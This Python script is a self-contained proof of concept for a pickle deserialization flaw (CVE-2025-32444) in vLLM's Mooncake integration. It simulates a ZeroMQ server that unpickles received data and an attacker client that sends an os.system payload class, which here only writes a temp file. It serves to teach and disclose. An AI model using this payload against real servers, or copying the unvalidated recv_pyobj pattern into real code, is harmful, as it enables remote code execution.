#!/usr/bin/env python3
"""
Demo Environment for vLLM Mooncake Integration Vulnerability (CVE-2025-32444)

This script creates a controlled environment to demonstrate the vulnerability
without requiring an actual vLLM installation. It simulates both the vulnerable
server and the exploit in a single script.

For educational purposes only.

Usage:
  python3 demo_environment.py
"""

import pickle
import os
import threading
import time
import zmq
import tempfile


def print_section(title):
    """Print a section title"""
    print("\n" + "=" * 60)
    print(f" {title}")
    print("=" * 60)


class RCEPayload:
    """Malicious payload class that will execute arbitrary commands when unpickled"""
    def __reduce__(self):
        # This will execute the specified command when the object is unpickled
        return (os.system, (self.cmd,))
    
    def __init__(self, cmd: str):
        self.cmd = cmd


def vulnerable_server(port):
    """
    Simulates the vulnerable vLLM Mooncake server
    This function creates a ZeroMQ PULL socket that uses recv_pyobj(),
    which is vulnerable to pickle deserialization attacks
    """
    print_section("VULNERABLE SERVER")
    print("[*] Starting vulnerable server (simulating vLLM with Mooncake)")
    print(f"[*] Listening on port {port}")
    
    # Create ZeroMQ context and socket
    context = zmq.Context()
    socket = context.socket(zmq.PULL)
    socket.bind(f"tcp://*:{port}")
    
    print("[*] Waiting for messages...")
    
    try:
        while True:
            # VULNERABLE CODE: Using recv_pyobj() without validation
            # This is similar to the vulnerable code in mooncake_pipe.py
            ack = socket.recv_pyobj()
            print(f"[*] Received message: {ack}")
            
            # Check if the message is the expected ACK
            if ack != b'ACK':
                print("[!] Received unexpected message format")
            
            # In the real code, this would free a buffer
            print("[*] Processing completed")
    
    except KeyboardInterrupt:
        print("[*] Server shutting down")
    finally:
        socket.close()
        context.term()


def exploit_client(port):
    """
    Simulates an attacker exploiting the vulnerability
    """
    # Wait for the server to start
    time.sleep(2)
    
    print_section("ATTACKER")
    
    # Create a temporary file as proof of exploitation
    temp_file = tempfile.mktemp(prefix="vllm_exploit_demo_")
    exploit_command = f"echo 'This file was created by exploiting the pickle deserialization vulnerability' > {temp_file}"
    
    print(f"[*] Preparing exploit to create file: {temp_file}")
    print(f"[*] Command to execute: {exploit_command}")
    
    # Create ZeroMQ context and socket
    context = zmq.Context()
    socket = context.socket(zmq.PUSH)
    socket.connect(f"tcp://localhost:{port}")
    
    # Create the malicious payload
    print("[*] Creating malicious pickle payload")
    malicious_object = RCEPayload(exploit_command)
    
    # Send the exploit
    print("[*] Sending exploit payload")
    socket.send_pyobj(malicious_object)
    
    # Clean up
    socket.close()
    context.term()
    
    # Wait for the command to execute
    time.sleep(1)
    
    # Check if the exploit was successful
    print_section("VERIFICATION")
    if os.path.exists(temp_file):
        print(f"[+] Exploit successful! File created at: {temp_file}")
        print(f"[+] File content:")
        with open(temp_file, 'r') as f:
            print(f.read())
    else:
        print(f"[-] Exploit failed. File not created at: {temp_file}")


def main():
    """Main function"""
    print_section("vLLM MOONCAKE VULNERABILITY DEMO")
    print("This script demonstrates the pickle deserialization vulnerability")
    print("in vLLM's Mooncake integration (CVE-2025-32444)")
    print("\nThe demo will:")
    print("1. Start a simulated vulnerable server (like vLLM with Mooncake)")
    print("2. Send a malicious pickle payload to the server")
    print("3. Verify that arbitrary code execution occurred")
    
    # Use a random port
    port = 50000
    
    # Start the vulnerable server in a separate thread
    server_thread = threading.Thread(target=vulnerable_server, args=(port,))
    server_thread.daemon = True
    server_thread.start()
    
    try:
        # Run the exploit
        exploit_client(port)
        
        print_section("EXPLANATION")
        print("What happened:")
        print("1. The server used ZeroMQ's recv_pyobj() to receive data")
        print("2. recv_pyobj() uses pickle to deserialize the received data")
        print("3. The attacker sent a specially crafted pickle payload")
        print("4. When deserialized, this payload executed arbitrary code")
        print("\nThis is exactly how the vulnerability in vLLM's Mooncake integration works.")
        print("The vulnerable code is in wait_for_ack() at line 179 of mooncake_pipe.py:")
        print("\n    ack = self.sender_ack.recv_pyobj()  # VULNERABLE")
        
        # Keep the server running for a bit
        time.sleep(2)
        
    except KeyboardInterrupt:
        print("\n[!] Demo aborted by user")
    
    print("\nDemo completed.")


if __name__ == "__main__":
    main()